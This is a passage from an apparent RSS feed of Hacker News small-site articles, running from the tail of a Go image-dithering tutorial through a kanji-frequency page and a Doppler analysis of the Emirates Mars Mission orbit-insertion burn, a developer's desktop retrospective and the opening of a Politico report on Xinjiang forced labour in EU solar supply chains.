<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it’s more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that’s worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) –&gt; 2 round( 2.7 ) –&gt; 3<br>
round( 1.5 ) –&gt; 2 round( 2.5 ) –&gt; 2<br>
round( 1.3 ) –&gt; 1 round( 2.3 ) –&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won’t
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you’ll want the random ranges to be the same for R, G, and B.</p>

<p>Here’s an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a “threshold matrix”. “Thresholding” is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it’s less than the matrix value, make
it black, otherwise white. Obviously this doesn’t work with any other kind of palette. So what’s the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there’s no citation,
but I’ve confirmed independently that it works. Here it is with some of my own math added as well.</p>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>×</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>×</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>−</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It’s the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you’ll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast –
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel’s colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that’s essentially the purpose of this – converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you’re using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you’ll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you’ve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you’re using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn’t make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it’s not the greatest. Here’s an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn’t really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error…</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Emirates Mars Mission Moi Burn Observed in Bochum]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26119770">thread link</a>) | @parsecs
<br/>
February 12, 2021 | https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/ | <a href="https://web.archive.org/web/*/https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9647">

	

	<div>
		
<p>A few days ago, <a href="https://www.emiratesmarsmission.ae/">Emirates Mars Mission (Hope)</a>, and <a href="https://destevez.net/tag/tianwen/">Tianwen-1</a> performed their Mars orbit injection burn (MOI). <a href="https://amsat-dl.org/">AMSAT-DL</a> made a livestream for each of the two events, showing the X-band signals of the spacecraft as received with the <a href="https://amsat-dl.org/en/20-meter-antenna/">20m antenna at Bochum</a>.</p>



<p>In the case of Tianwen-1 the signal was pretty strong even while the spacecraft was on the low gain antenna, and we could clearly see the <a href="https://youtu.be/1myQ5tIig0w?t=6593">change in Doppler rate as the thrusters fired up</a>. However, in the case of Emirates Mars Mission the signal <a href="https://youtu.be/413DdMua8ec?t=2641">disappeared as soon as the spacecraft switched to the low gain antenna</a>. In fact <a href="https://eyes.nasa.gov/dsn/dsn.html">DSN Now</a> reported a received power of -155 dBm with the 34m DSS55. That was a large drop from the -118 dBm that it was reporting with the high gain antenna. Therefore, nothing could be seen in the livestream waterfall until the spacecraft returned to the high gain antenna, well after the manoeuvre was finished.</p>



<p>Nevertheless, a weak trace of the carrier was still present in the livestream audio, and it could be seen by appropriate FFT processing, for example with <a href="https://github.com/miek/inspectrum">inspectrum</a>. I put up a <a href="https://twitter.com/ea4gpz/status/1359152918004461574">couple</a> of <a href="https://twitter.com/ea4gpz/status/1359161368289701888">tweets</a> showing this, but at the moment I wasn’t completely sure if what I was seeing was the spacecraft’s signal or some interference. After the livestream ended, I’ve been able to analyse the audio more carefully and realize that not only this weak signal was in fact the Hope probe, but that the start of the burn was recorded in perfect conditions.</p>



<p>In this post I’ll show how to process the livestream audio to clearly show the change in drift rate at the start of the burn and measure the acceleration of the spacecraft.</p>



<p>The idea with this post is that anyone can reproduce what I’m going to show. After all, the only data I’m using is the audio of a livestream that is recorded in Youtube. For convenience, I include with my code the segment of data I’m using, which is a 5 minute segment that starts 7850 seconds into the audio of the full video. If you want to start from scratch, you can use any webpage or application to download the audio of the full video, and work with that. In my case I used a webpage to download the audio in 320kbps MP3 format, then converted it to an 8ksps WAV file, and used <a href="https://www.scipy.org/">SciPy</a> to read the WAV file and extract the 5 minute segment.</p>



<p>In the figure below you can see the waterfall of the first minute of the 5 minute clip I cut. The spacecraft signal can be seen as faint diagonal lines between 700 and 800 Hz. They are quite weak and have some fading, but hopefully you can see them.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_start.png"><img width="644" height="438" src="https://destevez.net/wp-content/uploads/2021/02/emm_start-644x438.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_start-644x438.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_start-300x204.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_start.png 730w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>There is something that is convenient to remark about the Doppler correction system that was used at Bochum for the livestreams. First, the system used the trajectory of the the spacecraft, ignoring the burn, to compute the expected Doppler. Therefore, the expected Doppler computation would be quite good before the burn started, but as soon as the thrusters fired it would diverge more and more from reality.</p>



<p>Second, rather than constantly adjusting the tuning to correct for Doppler and keep the signal exactly centred, the system performed discrete jumps of fixed size with the goal of keeping the signal inside a certain band, roughly 350 Hz wide. This had the effect of creating a sawtooth wave in the waterfall and the audio. As the signal arrived to one edge of this imaginary band, the Doppler correction performed a frequency jump to put the signal at the other edge of the band.</p>



<p>This can be seen quite clearly in the livestream of Tianwen-1. At the <a href="https://youtu.be/1myQ5tIig0w?t=0">beginning of the livestream</a>, the drift rate was quite low, since the spacecraft was well away from periapsis. Therefore, the period of the sawtooth was long. As the spacecraft approached periapsis and the drift rate increased, the period of the sawtooth <a href="https://youtu.be/1myQ5tIig0w?t=4667">kept reducing</a> until it was quite short <a href="https://youtu.be/1myQ5tIig0w?t=6023">right before the burn</a>. However, note that the amplitude of the sawtooth (this is, the width of this imaginary frequency band) is always the same.</p>



<p>The next figure shows the waterfall of the audio when the burn starts. It is a bit difficult to see, but hopefully you’ll be able to see two or three lines at the left around 800 Hz, and then a couple of lines going up in steps and with less slope, near the middle of the image.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_burn.png"><img width="644" height="438" src="https://destevez.net/wp-content/uploads/2021/02/emm_burn-644x438.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_burn-644x438.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_burn-300x204.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_burn.png 730w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>When the burn starts, the drift rate increases (i.e., changes from negative to less negative), since the retrograde burn accelerated the spacecraft towards Earth. As the Doppler correction keeps tuning in steps to correct for a more negative drift rate, we get steps upwards. This is the same that happened at the <a href="http://youtu.be/1myQ5tIig0w?t=6593">start of the burn of Tianwen-1</a>. In that case the drift rate became almost zero, and then positive, since the thrust-to-mass ratio of Tianwen-1 is higher than that of Hope.</p>



<p>The resolution of the plots shown above, and those that come later is 0.98 Hz per FFT bin (FFT size of 8192 with a sample rate of 8ksps) and 64ms per time step (due to the use of overlapping FFT, and an advance of 512 samples per FFT).</p>



<p>In what follows, the idea is to undo the Doppler correction done at Bochum to join back the pieces of the sawtooth wave and also correct for the drift rate in order to get a signal of constant frequency that we may see clearly in a spectrum plot. To do this, we just need to create a sawtooth that has the same (or almost the same) phase, amplitude and period as the one that the Doppler correction created, and then use that sawtooth to control the frequency of a local oscillator with which we mix the audio signal. I have adjusted the parameters of the sawtooth by hand until I obtained something where the resulting signal before the start of the burn had a constant frequency and had no (or very brief) jumps.</p>



<p>The result of this correction can be seen below. We see the signal before the burn as a flat line at constant frequency, slightly above 800 Hz, and then the signal rising up as the burn starts. The vertical white line marks the moment in which the start of the burn happens, which is at 184.96 seconds into this 5 minute segment. The right panel contains the spectrum plot of the data in the left of the waterfall (to the left of the white line). The signal can be seen very clearly, with an (S+N)/N of about 5dB, which would give an estimated CN0 on the order of 3 dBHz.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_before_burn.png"><img width="644" height="427" src="https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-644x427.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-644x427.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-300x199.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-768x510.png 768w, https://destevez.net/wp-content/uploads/2021/02/emm_before_burn.png 856w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>If we now change the drift rate correction, we can make flat the signal after the burn. We see that the drift rate is not constant, but rather it increases slightly with time, so it is not possible to find a drift rate that makes the line totally flat. I have chosen a drift rate that makes the line flat at approximately 20 seconds after the start of the burn. The  right panel shows the spectrum of the right part of the waterfall (after the white line). Again, we have some 5 dB of (S+N)/N.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_after_burn.png"><img width="644" height="427" src="https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-644x427.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-644x427.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-300x199.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-768x510.png 768w, https://destevez.net/wp-content/uploads/2021/02/emm_after_burn.png 856w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>We have seen how by correcting the drift rate the “corner” of the Doppler curve, which marks the exact moment in which the thrusters started firing, can seen in the waterfall, whereas with the waterfall of the original audio signal it was impossible to see this corner. The moment in which the corner happens corresponds to 2:13:54.96 into the video, which by looking at the timestamps that appear in the screen shown in the video we can associate with 15:41:38 UTC (with a precision of perhaps one or two seconds). Since the light-time delay for this burn was 637 seconds, this means that the burn started at 15:31:01 UTC. This matches the official report of a start at 15:30 UTC, because it is possible that ullage motors fired one minute before the main burn, as we saw in <a href="https://destevez.net/2020/08/tianwen-1-tcm-1/">Tianwen-1’s TCM-1</a>.</p>



<p>The drift rate before the burn is -19.5 Hz/s, and when the burn starts it changes to -8 Hz/s. Such a drift rate change gives a line-of-sight acceleration of -0.41 m/s². This is just the projection of the acceleration vector onto the line-of-sight. In order to compute the full acceleration, we assume that it happened along the velocity vector of the spacecraft (with respect to Mars), and compute the projection of the unit velocity vector and the unit line-of-sight vector to Earth at the start of the burn. This computation ignores light-time delays, but is good enough for our purposes, since the line-of-sight vector changes slowly enough. The projection is 0.86.</p>



<p>This means that we only see 86% of the total acceleration in the Doppler drift rate. Therefore, the total acceleration must have been around -0.48 m/s². This contrasts to the theoretical acceleration of -0.58 m/s² that 720 N of thrust (since the spacecraft has 6x 120 N thrusters) applied to 1250 kg of mass produce (here the mass comes from a dry mass of 550 kg and 700 kg of fuel, assuming that the probe already spent in mid-course corrections 100 kg of its initial 800 kg).</p>



<p>Working backwards, we see that the measured acceleration of -0.48 m/s² would correspond to a thrust of 594 N. In fact, while I <a href="https://twitter.com/ea4gpz/status/1359081278079987712">worked out the planning of the manoeuvre on Twitter</a>, I noticed that the publicly stated burn length of 27 minutes was way too long to achieve the target orbit with a thrust of 720 N. To have a burn of 27 minutes that gave me the required apoapsis altitude I had to use a thrust of 658 N.</p>



<p>Note that all these calculations about the acceleration are just estimates, since we don’t know exactly the mass of the spacecraft, and our estimate of 1250 kg could be wrong by up to 10%. In any case, I think it is always good to go through these calculations to show what can be achieved with simple Doppler measurements and to check that the signal we observed matches what we expected.</p>



<p>The calculations and plots in this post have been done in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/EMM/MOI/Bochum%20MOI%20recording.ipynb">this Jupyter notebook</a>. The data file with the 5 minute segment of the livestream audio is included in the same repository. The results that I have shown are intended to be easily reproducible. It is possible to run the notebook with the supplied data or to start from scratch by downloading the audio from the livestream video on Youtube.</p>



<p>Many thanks and great work to all the AMSAT-DL team for organizing the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/">https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/</a></em></p>]]>
            </description>
            <link>https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119770</guid>
            <pubDate>Fri, 12 Feb 2021 23:23:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Screenshots from Developers: 2002 vs. 2015]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26119769">thread link</a>) | @beliu
<br/>
February 12, 2021 | https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/ | <a href="https://web.archive.org/web/*/https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>How things have (and have not changed). I'm still a command-line junkie with at least two xterm windows open. I'm still using a 3x3 virtual desktop. However, instead of fvwm, it is now LXDE. I've also switched from FreeBSD to Linux and I'm running Lubuntu as my distribution.</p>

<p>There are a lot of indispensable GUI tools that I use. These include Firefox, lyx, Gimp, KeepassX, Shutter, viking, dia, Wireshark, calibre, audacity, Handbrake and VLC. But where possible I still prefer to script things. My main development languages are still shell, Perl and C.</p>

<p>My shell is now bash. The vi keystrokes are burned into my fingertips and, as long as vim can be ported to new systems, that will be my text editor until I pass on. My mail client is now mutt (definitely not a web client) and my mail is stored locally, not on someone else's server.</p>

<p>The only issue I have is that, since a job change, I now have to deal with Windoze things. Thus, I have VirtualBox, libreoffice and Wine to help me do that.</p>

<p>I started with Unix on a Pyramid 90x. I now have a smart phone that blows the 90x out of the water on performance, RAM and storage. But I'm so very happy that, somewhere down underneath, there is still a Bourne shell and an operating system that does open(), close(), read(), write(), fork() and exec()!</p>
</div></div>]]>
            </description>
            <link>https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119769</guid>
            <pubDate>Fri, 12 Feb 2021 23:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fears over China’s Muslim forced labor loom over EU solar power]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26119752">thread link</a>) | @ericdanielski
<br/>
February 12, 2021 | https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
							<div id="amazon-polly-audio-table">
				<p>Press play to listen to this article</p>
				
		</div>
<p>Nearly every solar power panel sold in the European Union has its origins in China’s <a href="https://www.politico.com/news/2020/07/24/china-uighurs-europe-sanctions-381080" target="_blank">oppressed Xinjiang region</a>.</p>



<p>The solar industry and Brussels lawmakers argue Europe’s renewable energy push should not come at a human cost amid long-standing international concern over reports China has <a href="https://www.reuters.com/article/us-china-rights-un-idUSKBN1KV1SU" target="_blank">detained 1 million people</a> with Muslim backgrounds in camps in Xinjiang and is putting them to work.</p>



<p>“Everybody knows what’s going on in China, and when facilities are based there you have to accept that there’s a high possibility that forced labor will be used,” said Milan Nitzschke, president of <a href="https://www.prosun.org/en/mission-en/" target="_blank">EU ProSun</a>, an alliance of solar businesses seeking to promote sustainable, solar manufacturing based in the EU.&nbsp;</p>



<p>While the U.S. has already rolled out sanctions against products such as cotton and tomatoes originating from Xinjiang, the European Commission has avoided confronting China with any trade measures. </p>



<p>It has fallen to lawmakers in the European Parliament to try to push Brussels to implement trade bans, on all industries including solar panels, if companies are implicated in human rights abuses.</p>



<p>“Import bans need to complement as a last resort if forced labor is involved in the production, like in Xinjiang," said Green MEP Anna Cavazzini.</p>



<h3>Suspicions about every panel</h3>



<p>For the past decade Beijing has been carrying out a campaign to <a href="https://www.politico.eu/?p=1256994">detain and “reeducate”</a> the Muslim-majority population of the Xinjiang region.</p>



<p>Human rights groups have alerted that state-run reeducation centers <a href="https://www.politico.eu/?p=1408155">double as forced labor camps</a>, with detained people obliged to work in low-skilled, labor-intensive sectors such as cotton picking. But recent reports out of the region suggest the Xinjiang government has also been focusing on “upskilling” the workforce and putting them to work in more specialized sectors.</p>



<p>That’s of particular concern to the global solar industry given Xinjiang’s outsized role in the production of <a href="https://www.politico.eu/?p=62601">polysilicon</a>, a material used to make photovoltaic (PV) cells.&nbsp;</p>



<p>“Nearly every silicon-based solar module — at least 95 percent of the market — is likely to have some Xinjiang silicon in,” said Jenny Chase, head of solar analysis at BloombergNEF.</p>



<p>Industry analyst Johannes Bernreuter added that last year roughly 45 percent of the global supply of solar-grade polysilicon came from the region.&nbsp;</p>



<p>Raw polysilicon is transported to factories — usually outside Xinjiang — and melted into cylinders, known as ingots. Because it’s blended with polysilicon produced in other regions, it’s difficult to trace material that could potentially come from forced labor camps in Xinjiang, Chase and Bernreuter said.</p>



<p>For any single solar panel “the mathematical probability is relatively high" it has some material produced in the province, said Bernreuter.</p>



<h3>An open secret</h3>



<p>Beijing <a href="https://www.reuters.com/article/china-cotton-forced-labour-trfn-idUSKBN28P2CM" target="_blank">insists</a> the camps — which it calls “vocational training facilities” — are simply “helping people of all ethnic groups secure stable employment” and argues that this is “entirely different from forced labor.”&nbsp;</p>



<p>The China Photovoltaic Industry Association <a href="http://www.chinapv.org.cn/association_news/922.html" target="_blank">said</a> accusations of forced labor in Xinjiang were ”the lie of the century fabricated by several institutions and people from Western countries.”</p>



<p>In Europe, industry players said the potential use of forced labor to produce material included in solar panels imported into the EU was an open secret.</p>



<p>Industry group SolarPower Europe said it was investigating the situation in Xinjiang with its membership and looking at different options to ensure no forced labor was used in the PV manufacturing process.&nbsp;</p>



<p>“We cannot accept that such practices take place in the solar PV sector, which is a leader in sustainability and a key enabler of the energy transition,” said SolarPower Europe CEO Walburga Hemetsberger.</p>



